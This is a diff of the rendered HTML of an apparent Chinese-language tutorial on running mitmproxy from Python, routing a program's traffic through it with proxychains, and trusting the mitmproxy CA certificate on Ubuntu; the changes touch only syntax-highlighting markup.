+    <span class="n">options</span> <span class="o">=</span> <span class="n">Options</span><span class="p">(</span><span class="n">listen_host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">listen_port</span><span class="o">=</span><span class="mi">8080</span><span class="p">,</span> <span class="n">http2</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">DumpMaster</span><span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">with_termlog</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">with_dumper</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
     <span class="n">config</span> <span class="o">=</span> <span class="n">ProxyConfig</span><span class="p">(</span><span class="n">options</span><span class="p">)</span>
     <span class="n">m</span><span class="o">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">ProxyServer</span><span class="p">(</span><span class="n">config</span><span class="p">)</span>
     <span class="n">m</span><span class="o">.</span><span class="n">addons</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Addon</span><span class="p">())</span>
@@ -3604,20 +3498,18 @@ http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
 
     <span class="c1"># Other servers, such as a web server, might be started then.</span>
     <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;going to shutdown mitmproxy&#39;</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;going to shutdown mitmproxy&#39;</span><span class="p">)</span>
     <span class="n">m</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
 </code></pre></div>
 
-
 <p>安装proxychains:</p>
-<div class="codehilite"><pre><span></span><code><span class="err">apt install proxychains4</span>
+<div class="codehilite"><pre><span></span><code>apt install proxychains4
 </code></pre></div>
-
 
 <p>修改/etc/proxychains.conf，最后一行改成<code>http 127.0.0.1 8080</code></p>
 <p>添加信任：参考 https://superuser.com/questions/437330/how-do-you-add-a-certificate-authority-ca-to-ubuntu</p>
-<div class="codehilite"><pre><span></span><code><span class="err">cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitm.crt</span>
-<span class="err">update-ca-certificates</span>
+<div class="codehilite"><pre><span></span><code>cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitm.crt
+update-ca-certificates
 </code></pre></div>
                 
               
